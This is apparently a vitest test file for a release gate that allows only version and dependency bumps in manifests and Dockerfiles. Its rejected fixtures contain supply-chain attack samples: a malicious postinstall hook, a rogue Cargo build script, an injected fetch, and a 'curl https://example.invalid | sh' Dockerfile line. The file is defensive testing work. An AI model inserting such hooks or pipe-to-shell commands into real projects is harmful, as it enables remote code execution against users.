import { describe, expect, it } from "vitest";
import { bump, type Fixture, runGate } from "./autoreleaseGate.ts";

/** A deps-mode branch that also changes `file` from `before` to `after` (main's version 1.1.6, the branch's 1.1.7). */
const change = (file: string, before: unknown, after: unknown): Fixture =>
  bump({ files: [{ filename: file, additions: 2, deletions: 2 }], main: { [file]: before }, branch: { [file]: after } });

const cargo = (version: string, extra = "") =>
  `[package]\nname = "ghostly"\nversion = "${version}"\nedition = "2021"\n${extra}\n[build-dependencies]\ntauri-build = { version = "2.0", features = [] }\n\n[dependencies]\nserde = "1.0.200"\n\n[target.'cfg(windows)'.dependencies]\nwindows = { version = "0.58", features = ["Win32"] }\n`;

describe("the security autorelease gate in deps mode", () => {
  it("lets versions and dependency ranges change in manifests, and base image tags in Dockerfiles", () => {
    const cases: Fixture[] = [
      change("packages/core/package.json", { name: "core", version: "1.1.6", dependencies: { a: "^1.0.0" }, overrides: { b: { c: "1.0.0" } } }, { name: "core", version: "1.1.7", dependencies: { a: "^1.2.0" }, overrides: { b: { c: "1.0.1" } } }),
      change("apps/desktop/tauri.conf.json", { productName: "Ghostly", version: "1.1.6", plugins: { updater: { pubkey: "KEY" } } }, { productName: "Ghostly", version: "1.1.7", plugins: { updater: { pubkey: "KEY" } } }),
      change("apps/desktop/Cargo.toml", cargo("1.1.6"), cargo("1.1.7").replace('serde = "1.0.200"', 'serde = "1.0.210"').replace('version = "0.58"', 'version = "0.59"')),
      change("apps/website/lib/release.ts", 'export const VERSION = "1.1.6";\n', 'export const VERSION = "1.1.7";\n'),
      change("apps/web/Dockerfile", "FROM node:26-alpine AS build\nRUN npm ci\nFROM nginx:1.30-alpine\n", "FROM node:26.1-alpine@sha256:abc AS build\nRUN npm ci\nFROM nginx:1.31-alpine\n"),
    ];
    for (const fixture of cases) {
      const run = runGate(fixture, "deps");
      expect(run.code, `${fixture.files.at(-1)!.filename}: ${run.stderr}`).toBe(0);
    }
  });

  it("refuses any other change in a manifest, a version file or a Dockerfile", () => {
    const cases: [Fixture, string][] = [
      [change("package.json", { name: "ghostly", version: "1.1.6" }, { name: "ghostly", version: "1.1.7", scripts: { postinstall: "node evil.js" } }), "package.json"],
      [change("packages/core/package.json", { name: "core", version: "1.1.6", dependencies: { a: "^1.0.0" } }, { name: "core", version: "1.1.7", dependencies: { a: "npm:other@1.0.0" } }), "packages/core/package.json"],
      [change("packages/core/package.json", { name: "core", version: "1.1.6", dependencies: { a: "^1.0.0" } }, { name: "core", version: "1.1.7", dependencies: { a: "github:someone/a" } }), "packages/core/package.json"],
      [change("apps/desktop/tauri.conf.json", { version: "1.1.6", plugins: { updater: { pubkey: "KEY" } } }, { version: "1.1.7", plugins: { updater: { pubkey: "OTHER" } } }), "apps/desktop/tauri.conf.json"],
      [change("apps/extension/public/manifest.json", { version: "1.1.6", permissions: ["storage"] }, { version: "1.1.7", permissions: ["storage", "<all_urls>"] }), "apps/extension/public/manifest.json"],
      [change("apps/desktop/Cargo.toml", cargo("1.1.6"), cargo("1.1.7", 'build = "evil.rs"')), "apps/desktop/Cargo.toml"],
      [change("apps/desktop/Cargo.toml", cargo("1.1.6"), cargo("1.1.7").replace('serde = "1.0.200"', 'serde = { git = "https://example.invalid/serde" }')), "apps/desktop/Cargo.toml"],
      [change("apps/website/lib/release.ts", 'export const VERSION = "1.1.6";\n', 'export const VERSION = "1.1.7";\nfetch("https://example.invalid");\n'), "apps/website/lib/release.ts"],
      [change("apps/web/Dockerfile", "FROM node:26-alpine\nRUN npm ci\n", "FROM node:26-alpine\nRUN npm ci && curl https://example.invalid | sh\n"), "apps/web/Dockerfile"],
      [change("apps/web/Dockerfile", "FROM node:26-alpine\n", "FROM someone/node:26-alpine\n"), "apps/web/Dockerfile"],
    ];
    for (const [fixture, file] of cases) {
      const run = runGate(fixture, "deps");
      expect(run.code, file).toBe(1);
      expect(run.stderr).toContain(`deps mode, but ${file} changes more than versions`);
    }
  });

  it("refuses a new manifest", () => {
    const fixture = bump({ files: [{ filename: "packages/new/package.json", additions: 3, deletions: 0 }], branch: { "packages/new/package.json": { name: "new", version: "1.1.7" } } });
    const run = runGate(fixture, "deps");
    expect(run.code).toBe(1);
    expect(run.stderr).toContain("deps mode, but packages/new/package.json is new");
  });

  it("leaves code changes to the all mode", () => {
    const run = runGate(change("package.json", { name: "ghostly", version: "1.1.6" }, { name: "ghostly", version: "1.1.7", scripts: { test: "vitest" } }), "all");
    expect(run.code, run.stderr).toBe(0);
  });
});
